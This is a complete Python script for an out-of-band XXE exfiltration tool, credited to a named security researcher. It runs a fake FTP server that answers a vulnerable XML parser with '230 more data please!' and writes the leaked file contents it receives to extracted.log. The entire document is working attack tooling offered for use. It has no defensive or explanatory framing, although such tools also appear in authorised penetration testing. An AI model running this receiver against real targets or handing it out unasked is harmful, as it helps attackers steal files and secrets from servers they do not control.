#!/usr/bin/env python3
import socket
import sys
import argparse


name = """
=--------------------------------------=
|  230 OOB || an Out-Of-Band XXE tool  |                          
|    ____  _____  ___   ___  ____      |
|   (___ \(__  / / _ \ / _ \|  _ \     |
|     __) ) / / | | | | | | | |_) )    |
|    / __/ (__ \| | | | | | |  _ (     |
|   | |___ ___) ) |_| | |_| | |_) )    |
|   |_____|____/ \___/ \___/|____/     |
| 	       by Corben Douglas       |
|                                      |
|      - https://sxcurity.github.io    |
|      - https://hackerone.com/cdl     |
|      - https://twitter.com/sxcurity  |
=--------------------------------------=
"""

print(name)

parser = argparse.ArgumentParser(description='An Out-of-Band XXE tool by Corben Douglas')
parser.add_argument('port',type=int,help="Port for the FTP server to listen on (2121 / 21)")
args = parser.parse_args()

HOST = ''  
PORT = args.port

welcome = b'220 oob-xxe\n'
get = b'230 more data please!\n'


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def main(): 
    try:
        s.bind((HOST, PORT))
    except socket.error as msg:
        print('[+] ERROR: Bind failed. ')
        sys.exit() 

    s.listen(10)
    print('[+] 230OB started on port: '+str(PORT))


    conn, addr = s.accept()
    print('[*] Connection from: '+addr[0]+"!")
    conn.sendall(welcome) 

    while True:    
        data = conn.recv(1024)
        conn.sendall(get)
        line = data.decode('UTF-8')
        line = line.replace("\n","").replace("CWD","")
        print(line)     
        extract(line)     
    s.close()

def extract(data):
        fopen = open('./extracted.log', 'a')
        fopen.write(data)
        fopen.close()

try:
    main()
except KeyboardInterrupt:
    s.close()
